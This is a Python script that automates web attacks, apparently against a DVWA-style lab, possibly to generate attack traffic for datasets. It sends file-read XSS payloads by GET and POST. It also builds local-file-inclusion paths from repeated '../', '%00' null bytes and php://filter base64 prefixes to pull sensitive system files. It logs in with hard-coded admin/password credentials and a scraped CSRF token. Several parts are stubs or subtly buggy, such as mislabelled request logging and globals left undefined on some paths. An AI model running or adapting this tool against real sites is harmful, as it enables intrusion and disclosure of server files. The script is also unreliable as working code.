#!/usr/bin/python

from multiprocessing.dummy import Pool as ThreadPool
import argparse
import urllib3
import urllib

#----------------------------
# XSS
#----------------------------
def xss(param):
    '''
    Tests the url_path for Cross Site Scripting (DOM, Reflected, ). Can be improved
    But for now, just suitable for generating attack data. The tests are executed
    with both POST and GET verbs

    param: the body/url parameter to attack

    '''
    # run POST requests in separate thread from GET requests
    filename = "xss.txt"
    # Create num_threads in the thread Pool
    make_post_workers = ThreadPool(num_threads)
    make_get_workers = ThreadPool(num_threads)

    # read the file;
    with open(filename) as f:
        attack_strings = f.readlines()
        attack_strings = map(str.rstrip, attack_strings)

    # make posts with data in url
    make_post_workers.map(post, map(urllib.urlencode, [{param:string} for string in attack_strings]), num_threads) # chunksize=numthreads
    # make posts with data in body
    make_post_workers.map(post, [{param:string} for string in attack_strings])
    # make get requests
    make_get_workers.map(get, attack_strings, num_threads)
    make_post_workers.close()
    make_get_workers.close()
    make_post_workers.join()
    make_get_workers.join()


#----------------------------
# CSRF
#----------------------------

#----------------------------
# FILE UPLAOD/DOWNLOAD
#----------------------------
def lfi():
    '''
    Tests the url_path for Local File Inclusion Vulnerabilities. Can be improved
    But for now, just suitable for generating attack data.
    requests
    '''
    sensitive_files = []

    filename = "{}_sensitive.txt".format(system.lower())
    # Create num_threads in the thread Pool
    make_path_workers = ThreadPool(num_threads)
    make_request_workers = ThreadPool(num_threads)

    # read the file; file name should be checked but skipping that
    with open(filename) as f:
        sensitive_files = f.readlines()
        sensitive_files = map(str.rstrip, sensitive_files)

    # use map to create the paths. Then send the requests
    make_request_workers.map(get, make_path_workers.map(make_path, sensitive_files, num_threads)) # chunksize=numthreads
    make_path_workers.close()
    make_path_workers.join()
    make_request_workers.close()


def make_path(filename):
    '''
    Returns a list of test paths for a filename
    '''
    suffices=["%00", "?"]
    prefixes=["php://filter/convert.base64-encode/resource=", "php://filter/convert.base64-encode/resource="]
    tests = []
    if prefix_length < 1:
        pass
        # TODO: functionality incomplete
    else:
        # TODO: URL encode some paths
        for length in range(0, prefix_length+1):
            path = "../" * length
            path1 = path + filename
            # if the file has an extension, try the replacing with underscore
            path2 = path + filename[::-1].replace(".", "_",1)[::-1]
            # add suffices
            suff_res1 = map((path1 + "{}").format, suffices)
            suff_res2 = map((path2 + "{}").format, suffices)
            # add prefixes
            pref_res1 = map(("{}" + path1).format, prefixes)
            pref_res2 = map(("{}" + path2).format, prefixes)
            # add both
            pref_suff_res1 = map(("{}" + path1 + "{}").format, prefixes, suffices) # i'm ware the shorter list wins
            pref_suff_res2 = map(("{}" + path2 + "{}").format, prefixes, suffices)
            # consolidate all
            tests += suff_res1 + [path1, path2] + suff_res2 + pref_res1 + pref_res2 + pref_suff_res1 + pref_suff_res2
            
    return tests

# Probably redundant as the attack file is usually a url.
# I guess one can learn on the contents of malicious files such as reverse shells
# but excluding this attack for data generation
def rfi():
    pass

def file_upload():
    pass

def post(data):
    '''
    Makes a post request to url_path after authentication (if any)
    data: The data to submit to URL either as body data (submit as dictionary) or as url data (submit as string)
    '''
    # TODO: Extend to support checking for test result
    if isinstance(data, str):
        # data is intended for URL; encode and send
        http.request('POST', '{}{}{}'.format(base_url, post_xss_path, data), headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
                    'Cookie': cookie,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Upgrade-insecure-request': '1',
                    'Referer': '{}{}'.format(base_url, post_xss_path)})
        print ("Sent GET request to {}{}{}".format(base_url, get_xss_path, data))
    else:
        # data is intended for POST body
        http.request('POST', base_url + post_xss_path, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
                    'Cookie': cookie,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Upgrade-insecure-request': '1',
                    'Referer': '{}/index.php'.format(base_url)},\
                    fields=data)
    print("Sent POST request to {} with {}".format(base_url + post_xss_path, str(data)))

def get(path_or_resource):
    '''
    Makes a get request to url_path after authentication (if any)
    '''
    # TODO: Extend to support checking for test result
    if lfi_path:
        for filename in path_or_resource:
            http.request('GET', base_url + lfi_path + filename, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
                    'Cookie': cookie,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Upgrade-insecure-request': '1',
                    'Referer': '{}/index.php'.format(base_url)})
            print ("Sent GET request to {}{}{}".format(base_url,lfi_path,filename))

    if get_xss_path and ("xss_d" in xss_path):
        http.request('GET', '{}{}{}'.format(base_url, xss_path, path_or_resource), headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
                    'Cookie': cookie,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Upgrade-insecure-request': '1',
                    'Referer': '{}{}'.format(base_url, xss_path)})
        print ("Sent GET request to {}{}{}".format(base_url, xss_path, path_or_resource))

    if get_xss_path and ("xss_r" in xss_path):
        http.request('GET', '{}{}{}'.format(base_url, xss_path, path_or_resource), headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
                    'Cookie': cookie,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Upgrade-insecure-request': '1',
                    'Referer': '{}{}'.format(base_url, xss_path)})
        print ("Sent GET request to {}{}{}".format(base_url, xss_path, path_or_resource))
    

def error(msg):
    print("[ERROR]: " + msg)
    exit(1)

if __name__ == '__main__':
    lfi_path = None
    get_xss_path = None
    post_xss_path = None
    base_url = None
    cookie = None
    num_threads = None
    system = None
    prefix_length = None
    # TODO: Probably use a config file to allow user supply headers and other details
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--base_url", help="The base URL of the web application", action="store", dest="base_url", type=str)
    parser.add_argument("-l", "--lfi_path", help="The resource to test for Local File Inclusion", action="store", dest="lfi_path", type=str)
    parser.add_argument("-x", "--xss_path", help="The resource to test for Cross-Site Scripting", action="store", dest="xss_path", type=str)
    parser.add_argument("-c", "--csrf_path", help="The resource to test for Cross-Site Reuest forgery", action="store", dest="csrf_path", type=str)
    parser.add_argument("-f", "--file_upload", help="The resource to test for file upload", action="store", dest="file_upload_path", type=str)
    parser.add_argument("-t", "--num_threads", help="The number of threads per activity", action="store", dest="num_threads", type=int)
    parser.add_argument("-H", "--header", help="A header for the request", action="append", dest="header", type=list)
    parser.add_argument("-a", "--auth", help="The resource to submit auth requests to", action="store", dest="auth", type=str)
    parser.add_argument("-p", "--prefix_length", help="The max number of ../ to prepend to paths for lfi", action="store", dest="prefix_length", type=int)
    parser.add_argument("-o", "--system", help="The operating system hosting the web app. Either windows or linux", action="store", dest="system", type=str)
    parser.add_argument("--param", help="Param for XSS if not present in the url", action="store", type=str, dest="param")
    args = parser.parse_args()
    http = urllib3.PoolManager()
    if args.base_url and args.auth:
        # if auth is required, make auth
        get_resp = http.request('GET', args.base_url)
        index = get_resp.data.rfind('user_token\' value=\'') # the search string has 19 chars
        cookie = get_resp.headers['Set-Cookie']
        post_resp = http.request('POST', "{}{}".format(args.base_url, args.auth), \
        headers={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Cookie': cookie,
                'Referer': "{}{}".format(args.base_url, args.auth)},\
        fields={'username':'admin', 'password':'password', 'Login':'Login', 'user_token':get_resp.data[index+19: index+19+32]})

    if args.base_url and args.lfi_path and args.prefix_length and (args.system in ['windows', 'linux']) and args.num_threads:
        prefix_length = args.prefix_length
        system = args.system
        num_threads = args.num_threads
        lfi_path = args.lfi_path
        base_url = args.base_url
        lfi()
        
    if args.xss_path and args.base_url:
        base_url = args.base_url
        xss_path = args.xss_path
        num_threads = 5 if not args.num_threads else args.num_threads
        q_index = xss_path.find("?") + 1
        if args.param == None:
            # attempt to find the params from the path
            param = xss_path[q_index:xss_path.find("=")]
            post_xss_path = xss_path[:q_index] if q_index != 0 else xss_path
            get_xss_path = xss_path
        else:
            param = args.param
        post_xss_path = xss_path[:q_index] if q_index != 0 else xss_path
        get_xss_path = xss_path
        xss(param)
